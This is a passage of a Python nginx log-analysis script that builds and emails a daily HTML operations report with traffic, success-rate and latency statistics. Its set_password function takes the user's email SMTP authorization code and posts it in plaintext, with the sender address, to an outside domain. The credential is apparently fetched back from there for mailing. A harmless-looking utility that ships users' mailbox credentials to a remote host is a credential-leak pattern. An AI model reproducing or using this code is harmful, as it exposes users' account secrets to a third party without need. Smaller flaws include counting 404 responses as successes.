    # 附图成功率
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(images['success_rate'].getvalue()).decode()}" style="margin: 10px auto;width: 100%;">'''
    # 生成时延表格
    latency_df = pd.DataFrame(latency_data, columns=['Module'] + dates)
    module_report_html += f"<h3>附10：近一周的平均时延指标趋势</h3>"
    module_report_html += latency_df.to_html(index=False,escape=False, classes="styled-table")
    # 附图时延
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(images['latency'].getvalue()).decode()}" style="margin: 10px auto;width: 100%;">'''
    # 统计系统资源数据
    module_report_html += f"<h3>附11：近一天关键指标服务器资源消耗统计</h3>"
    res_data = get_res_data()
    module_report_html += res_data if res_data else "暂无数据"
    head_info = f"""
        <div style="margin:10px auto;">
        <p style="line-height: 1.5;">各位领导、同事好，{service}{date.strftime('%m月%d日')}业务运行情况如下，烦请审阅。</p>
        <div style="text-indent:20px">
            <p style="line-height: 1.5;">1. 访问情况（{status}）: 成功率<span style="color: #FF0000">{success_rate}%</span>，平均时延<span style="color: #FF0000">{avg_latency}s</span>，超3秒请求量<span style="color: #FF0000">{req_times_3000}</span>，总访问量（PV）<span style="color: #FF0000">{total_requests}</span>，较上周同期{total_requests_risk}，独立IP数（UV）<span style="color: #FF0000">{unique_ips}</span>，较上周同期{unique_ips_risk}。</p>
            {get_module_des(access_volume_data,success_rate_data,latency_data)}
        </div>
        </div>
                """

    report = html%(head_info + module_report_html)
    title = service + f"运维日常通报({today})"
    send_mail(message=report,title=title)

def isExclude_Suffix(line_request):

    regex = r"\.(jpg|jpeg|png|gif|mp4|css|js)$"
    res = re.search(regex, line_request)
    boolean = not res and line_request not in ['-','/']
    return boolean


def generateTrs_timeout(result):
    filedata = """
    <table border="1" cellpadding="10" cellspacing="0" style="text-align: center;font-size:14px" class="styled-table">
        <thead>
            <tr style="background: #e0e0e0">
                <th style="border:1px solid silver;">序号</th>
                <th style="border:1px solid silver;">请求URL</th>
                <th style="border:1px solid silver;">访问量</th>
                <th style="border:1px solid silver;">成功率</th>
                <th style="border:1px solid silver;">超时率</th>
                <th style="border:1px solid silver;">时延(秒)</th>
                <th style="border:1px solid silver;">1-100ms</th>
                <th style="border:1px solid silver;">101-500ms</th>
                <th style="border:1px solid silver;">501-1000ms</th>
                <th style="border:1px solid silver;">1001-3000ms</th>
                <th style="border:1px solid silver;">3001-5000ms</th>
                <th style="border:1px solid silver;">5000ms以上</th>
            </tr>
        </thead>
        <tbody>
            %s
        </tbody>
    </table>
    """
    strTrs = ""
    for index,(key, value) in enumerate(result,start=1):
        req_total_time = value["req_total_time"]
        # 访问量
        visits = value['success'] + value['fail']
        req_times_1_100 = value['req_times_1_100']
        req_times_101_500 = value['req_times_101_500']
        req_times_501_1000 = value['req_times_501_1000']
        req_times_1001_3000 = value['req_times_1001_3000']
        req_times_3001_5000 = value['req_times_3001_5000']
        req_times_5001_more = value['req_times_5001_more']

        # 成功率
        successnum = value["success"]
        successrate = round(float(successnum) / visits * 100, 2)
        # 超时率
        timeoutnum = value["req_times_5001_more"]
        timeoutrate = round(float(timeoutnum) / visits * 100, 2)
        # 时延
        timedelay = round(req_total_time / visits, 2)
        strTrs += f"""
            <tr>
                <td style="border:1px solid silver;">{index}</td>
                <td style="border:1px solid silver;">{key}</td>
                <td style="border:1px solid silver;">{visits}</td>
                <td style="border:1px solid silver;">{successrate}%</td>
                <td style="border:1px solid silver;">{timeoutrate}</td>
                <td style="border:1px solid silver;">{timedelay}</td>
                <td style="border:1px solid silver;">{req_times_1_100}</td>
                <td style="border:1px solid silver;">{req_times_101_500}</td>
                <td style="border:1px solid silver;">{req_times_501_1000}</td>
                <td style="border:1px solid silver;">{req_times_1001_3000}</td>
                <td style="border:1px solid silver;">{req_times_3001_5000}</td>
                <td style="border:1px solid silver;">{req_times_5001_more}</td>
            </tr>
        """

    if strTrs:
        filedata = filedata % strTrs
        return filedata
    return ""

def generateTrs_error(result):
    filedata = """
            <table border="1" cellpadding="10" cellspacing="0" style="text-align: center;font-size:14px" class="styled-table">
                <thead>
                    <tr style="background: #e0e0e0">
                        <th style="border:1px solid silver;">序号</th>
                        <th style="border:1px solid silver;">请求URL</th>
                        <th style="border:1px solid silver;">访问量</th>
                        <th style="border:1px solid silver;">失败量</th>
                        <th style="border:1px solid silver;">失败率</th>
                        <th style="border:1px solid silver;">时延(秒)</th>
                        <th style="border:1px solid silver;">1-100ms</th>
                        <th style="border:1px solid silver;">101-500ms</th>
                        <th style="border:1px solid silver;">501-1000ms</th>
                        <th style="border:1px solid silver;">1001-3000ms</th>
                        <th style="border:1px solid silver;">3001-5000ms</th>
                        <th style="border:1px solid silver;">5000ms以上</th>
                    </tr>
                </thead>
                <tbody>
                    %s
                </tbody>
            </table>
            """

    strTrs = ""
    for index,(key, value) in enumerate(result,start=1):
        req_total_time = value["req_total_time"]
        # 访问量
        # 访问量
        visits = value['success'] + value['fail']
        req_times_1_100 = value['req_times_1_100']
        req_times_101_500 = value['req_times_101_500']
        req_times_501_1000 = value['req_times_501_1000']
        req_times_1001_3000 = value['req_times_1001_3000']
        req_times_3001_5000 = value['req_times_3001_5000']
        req_times_5001_more = value['req_times_5001_more']

        # 失败量
        errornum = value["fail"]
        # 失败率
        errorrate = round(float(errornum) / visits * 100, 2)
        # 时延
        timedelay = round(req_total_time / visits, 2)
        strTrs += f"""
                    <tr>
                        <td style="border:1px solid silver;">{index}</td>
                        <td style="border:1px solid silver;">{key}</td>
                        <td style="border:1px solid silver;">{visits}</td>
                        <td style="border:1px solid silver;">{errornum}</td>
                        <td style="border:1px solid silver;">{errorrate}%</td>
                        <td style="border:1px solid silver;">{timedelay}</td>
                        <td style="border:1px solid silver;">{req_times_1_100}</td>
                        <td style="border:1px solid silver;">{req_times_101_500}</td>
                        <td style="border:1px solid silver;">{req_times_501_1000}</td>
                        <td style="border:1px solid silver;">{req_times_1001_3000}</td>
                        <td style="border:1px solid silver;">{req_times_3001_5000}</td>
                        <td style="border:1px solid silver;">{req_times_5001_more}</td>
                    </tr>
                """
    if strTrs:
        filedata = filedata % strTrs
        return filedata
    return ""

def classify_user_agent(user_agent):
    user_agent = user_agent.lower()  # 统一转换为小写

    # 归类为 爬虫
    if 'bot' in user_agent or 'spider' in user_agent or 'crawl' in user_agent:
        return '爬虫'

    # 归类为 小程序
    if 'micromessenger' in user_agent or 'alipay' in user_agent or 'baiduboxapp' in user_agent or 'qq' in user_agent or 'toutiao' in user_agent:
        return '小程序'

    # 归类为 APP
    if 'iphone' in user_agent or 'ipad' in user_agent or 'android' in user_agent or 'weibo' in user_agent or 'douyin' in user_agent:
        return 'app'

    # 归类为 Web 浏览器
    if ('chrome' in user_agent or 'safari' in user_agent or 'firefox' in user_agent or 'edge' in user_agent) and \
       ('windows' in user_agent or 'macintosh' in user_agent or 'linux' in user_agent):
        return 'web'

    # 归类为 PC（非浏览器访问）
    if 'windows' in user_agent or 'macintosh' in user_agent or 'linux' in user_agent:
        return 'pc'

    # 归类为 电视/机顶盒
    if 'smart-tv' in user_agent or 'xbox' in user_agent or 'playstation' in user_agent:
        return '电视/机顶盒'

    # 默认归类为 其他
    return '其他'

def default_int():
    return defaultdict(int)

# 字典存储日志数据
def process_log_file(file_path):
    # 获取配置
    log_separator = config['nginx_log_format']['log_separator']
    field_indexes = config['nginx_log_format']['field_indexes']
    is_json = config['nginx_log_format']['is_json']
    module_urls = config['module_urls']
    request_url_data = defaultdict(default_int)
    # 统计模块的访问数据
    log_dict = {
        'ip': defaultdict(int),  # 使用集合存储唯一的IP地址
        'status_codes': defaultdict(int),
        'method_count': {},  # 统计不同method类型的计数
        'method_success':defaultdict(default_int),
        'referrer_count': {},  # 统计不同referrer的计数
        'user_agent_count': {},  # 统计不同user agent的计数
        'user_agent_success': defaultdict(default_int),
        'modules': {module: {'total_requests': 0, 'success_requests': 0, 'total_latency': 0} for module in module_urls},
        # 各模块数据
        'total_requests': 0,  # 总请求量
        'total_success_requests': 0,  # 总成功请求数
        'req_times_3000': 0, # 超三秒请求
        'total_latency': 0,  # 总时延
        'hourly_traffic': {i: 0 for i in range(24)}  # 存储24小时内的访问量
    }
    print("\033[31m2.获取并处理nginx数据...请耐心等待...\033[0m")
    static_extensions = config["nginx_log_format"]["exclude"]["static_extensions"]
    prefix_filters = config["nginx_log_format"]["exclude"]["prefix_filters"]
    try:
        file = gzip.open(file_path, "rt") if file_path.endswith('.gz') else open(file_path, 'r')
        # 读取日志文件并解析每一行
        for line in file:
            try:
                fields = json.loads(line.strip()) if is_json else line.strip().split(log_separator)  # 使用分隔符将日志行分割为字段数组

                # 从配置中获取字段的下标，并提取对应的数据
                ip = fields[field_indexes['ip']].strip()
                timestamp_str = fields[field_indexes['timestamp']].strip()
                time_obj = datetime.strptime(timestamp_str[1:-1], "%d/%b/%Y:%H:%M:%S %z")
                # 提取小时
                hour = time_obj.hour
                request_time = float(fields[field_indexes['request_time']].strip())
                if config["time_delay_unit"] == 'ms':
                    request_time = round(request_time/1000,2)
                method = fields[field_indexes['method']].strip()
                url = fields[field_indexes['url']].strip()
                line_request = url.split("?")[0]
                # 如果 static_extensions 为空，则跳过文件扩展名过滤
                if static_extensions:
                    # 构建正则表达式，排除静态资源请求
                    extensions_pattern = r'(' + '|'.join([re.escape(ext) for ext in static_extensions]) + r')$'
                    # 检查是否是静态文件请求
                    if re.search(extensions_pattern, line_request):
                        continue

                # 检查是否以指定前缀开头
                if any(line_request.startswith(prefix) for prefix in prefix_filters):
                    continue

                status = fields[field_indexes['status']].strip()
                status = status.split(":")[-1]
                status = int(status)
                # referrer = fields[field_indexes['referrer']] if field_indexes['referrer'] < len(fields) else ""
                user_agent = fields[field_indexes['user_agent']].strip() if field_indexes['user_agent'] < len(fields) else ""

                # 更新IP集合
                log_dict['ip'][ip] += 1
                # 按状态码分类统计
                if 200 <= status < 300:
                    log_dict["status_codes"]["2xx"] += 1
                elif 300 <= status < 400:
                    log_dict["status_codes"]["3xx"] += 1
                elif 400 <= status < 500:
                    log_dict["status_codes"]["4xx"] += 1
                elif 500 <= status < 600:
                    log_dict["status_codes"]["5xx"] += 1
                # 请求方法统计
                log_dict['method_count'][method] = log_dict['method_count'].get(method, 0) + 1
                # 引用统计
                # log_dict['referrer_count'][referrer] = log_dict['referrer_count'].get(referrer, 0) + 1

                # 调用 classify_user_agent 函数进行分类
                category = classify_user_agent(user_agent)
                # 更新统计
                log_dict['user_agent_count'][category] = log_dict['user_agent_count'].get(category, 0) + 1
                # 计算请求方法的成功率、客户端类型成功率
                if 200 <= status < 400:
                    log_dict["method_success"][method]["success"] += 1
                    log_dict["user_agent_success"][category]["success"] += 1
                else:
                    log_dict["method_success"][method]["failure"] += 1
                    log_dict["user_agent_success"][category]["failure"] += 1

                # request_url采集
                if isExclude_Suffix(line_request):
                    if request_time <= 0.1:
                        request_url_data[line_request]["req_times_1_100"] += 1
                    elif request_time <= 0.5:
                        request_url_data[line_request]["req_times_101_500"] += 1
                    elif request_time <= 1.0:
                        request_url_data[line_request]["req_times_501_1000"] += 1
                    elif request_time <= 3.0:
                        request_url_data[line_request]["req_times_1001_3000"] += 1
                    elif request_time <= 5.0:
                        request_url_data[line_request]["req_times_3001_5000"] += 1
                    else:
                        request_url_data[line_request]["req_times_5001_more"] += 1

                    if status >= 200 and status < 400 or status == 404:
                        request_url_data[line_request]["success"] += 1
                    else:
                        request_url_data[line_request]["fail"] += 1
                    # 请求总的耗时
                    request_url_data[line_request]["req_total_time"] += request_time

                # 总访问量
                log_dict['total_requests'] += 1

                # 超三秒请求
                if request_time > 3:
                    log_dict['req_times_3000'] += 1
                # 判断请求是否成功 (2xx, 3xx 状态码)
                if status >= 200 and status < 400 or status == 404:
                    log_dict['total_success_requests'] += 1

                # 累加时延（此处模拟为字节数，实际应根据实际字段进行修改）
                log_dict['total_latency'] += request_time

                # 检查是否属于模块URL
                for module, urls in module_urls.items():
                    if any(line_request.startswith(module_url) for module_url in urls):
                        log_dict['modules'][module]['total_requests'] += 1
                        if status >= 200 and status < 400 or status == 404:
                            log_dict['modules'][module]['success_requests'] += 1
                        log_dict['modules'][module]['total_latency'] += request_time
                # 每小时的访问量统计
                log_dict['hourly_traffic'][hour] += 1
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)
    finally:
        file.close()

    keys = ['req_times_1_100', 'req_times_101_500', 'req_times_501_1000', 'req_times_1001_3000',
            'req_times_3001_5000', 'req_times_5001_more', 'success', 'fail', 'req_total_time']
    for line_request in request_url_data.keys():
        for key in keys:
            if key not in request_url_data[line_request].keys():
                request_url_data[line_request][key] = 0
    log_dict['request_url_data'] = request_url_data

    return log_dict

# 计算基本统计数据（访问量、成功率、UV）
def calculate_metrics(log_dict):
    # 总访问量
    total_requests = log_dict['total_requests']

    # 总成功请求数
    success_requests = log_dict['total_success_requests']

    # 总成功率
    success_rate = round(success_requests / total_requests * 100,2) if total_requests > 0 else 0

    # 超三秒请求数
    req_times_3000 = log_dict['req_times_3000']

    # 总平均时延
    avg_latency = round(log_dict['total_latency'] / total_requests,2) if total_requests > 0 else 0

    # UV计算独立IP数
    unique_ips = len(log_dict['ip'])

    return total_requests, success_rate, req_times_3000,avg_latency, unique_ips

# 计算并存储每个模块的数据
def calculate_module_metrics(log_dict):
    module_metrics = {}
    for module in config['module_urls']:
        if module not in log_dict['modules']:
            module_metrics[module] = {
                'total_requests': 0,
                'success_requests': 0,
                'success_rate': 0,
                'avg_latency': 0
            }

    for module, data in log_dict['modules'].items():
        total_requests = data['total_requests']
        success_requests = data['success_requests']
        success_rate = round(success_requests / total_requests * 100,2) if total_requests > 0 else 0
        avg_latency = round(data['total_latency'] / total_requests,2) if total_requests > 0 else 0  # 平均时延

        module_metrics[module] = {
            'total_requests': total_requests,
            'success_requests': success_requests,
            'success_rate': success_rate,
            'avg_latency': avg_latency
        }

    return module_metrics

def send_mail(message, title):
    """
       邮件通知
       :return: None
    """
    print("\033[31m5.开始发送邮件...\033[0m")
    to_addr = config["recipient"]

    def _format_addr(emails):
        addr_list = []
        for name, addr in emails.items():
            addr_list.append(formataddr((Header(name, 'utf-8').encode(), addr)))
        return ','.join(addr_list)

    from_addr = config["sender"]
    password = py3_get_pwd(from_addr, "pwd")
    smtp_server = config["smtp_server"]
    msg = MIMEMultipart()
    msg.attach(MIMEText(message, 'html', 'utf-8'))

    name, addr = parseaddr(f"{from_addr} <{from_addr}>")
    msg["From"] = formataddr((Header(name, 'utf-8').encode(), addr))
    msg['Subject'] = Header(title, 'utf-8').encode()

    msg["to"] = _format_addr(to_addr)
    server = smtplib.SMTP_SSL(smtp_server, 465)  # SMTP协议默认端口是25
    server.login(from_addr, password)
    server.sendmail(from_addr, to_addr.values(), msg.as_string())
    print("\033[32m---恭喜，邮件发送成功!---\033[0m")
    server.quit()

def merge_dicts(dict1, dict2):
    """递归合并两个字典"""
    for key, value in dict2.items():
        if isinstance(value, dict):
            if key not in dict1:
                dict1[key] = {}
            merge_dicts(dict1[key], value)
        else:
            dict1[key] = dict1.get(key, 0) + value
    return dict1

def merge_results(results):
    """合并多个进程的统计结果"""
    final_log_dict = defaultdict(default_int)  # 初始化最终字典
    for result in results:
        merge_dicts(final_log_dict, result)
    return final_log_dict

def read_nginx_log_parallel():
    with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
        results = pool.map(process_log_file, nginx_files)

    # 合并多个子进程的统计结果
    final_log_dict = merge_results(results)
    return final_log_dict

# 主程序入口
def main():
    # 初始化数据库
    init_db()
    # 读取并解析Nginx日志
    log_dict = read_nginx_log_parallel()

    # 计算基本统计数据
    total_requests, success_rate, req_times_3000,avg_latency, unique_ips = calculate_metrics(log_dict)

    # 计算各模块的统计数据
    module_metrics = calculate_module_metrics(log_dict)

    # 插入每日统计数据到数据库
    today = datetime.now().date()
    date = (datetime.now() - timedelta(days=1)).date()
    insert_or_update_daily_data(date, total_requests, success_rate,req_times_3000, avg_latency, unique_ips, module_metrics)
    print("\033[31m3.数据准备就绪...\033[0m")
    # 发送报告邮件
    send_report_via_email(date=date,log_dict=log_dict,service=config['service'],today=today)

def get_nginx_files(base_dir):
    # IP地址的正则表达式
    ip_pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    fmt_yes = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    # 获取所有子目录
    nginx_files = []
    for entry in os.listdir(base_dir):
        # 获取完整路径
        full_path = os.path.join(base_dir, entry)
        # 确保是目录并且名称符合IP格式
        if os.path.isdir(full_path) and ip_pattern.match(entry):
            files = os.listdir(full_path)
            for filename in files:
                filepath = os.path.join(full_path, filename)
                if os.path.isfile(filepath) and filename.startswith("access") and fmt_yes in filename:
                    nginx_files.append(filepath)
    return nginx_files

def set_password():
    def post_data(ip, date, jsondata):
        url = "https://firedesigns.com.cn/pwd/insert"
        data = {"ip": ip, "date": date, "jsondata": jsondata}
        data = json.dumps(data)
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=data, headers=headers)
        return response
    sensitive_data = sys.argv[1].strip()
    data = {"username": config["sender"], "pwd": sensitive_data}
    response = post_data(config["sender"], "pwd", json.dumps(data))
    if response.json()['status'] == 'inserted':
        print("\033[32m邮箱授权码设置成功!\033[0m")
    else:
        print("\033[31m邮箱授权码设置失败!\033[0m")

# 执行主程序
if __name__ == "__main__":
    import sys
    config = load_config()
    if len(sys.argv) == 2:
        set_password()
    elif len(sys.argv) == 1:
        print("\033[31m1.初始化...\033[0m")
        # nginx日志路径
        base_dir = config["base_dir"]
        nginx_files = get_nginx_files(base_dir)
        # 设置日志路径和邮件配置
        if nginx_files:
            DB_PATH = "./nginx_report.db"
            main()
    else:
        print("\033[31m位置参数不正确!\033[0m")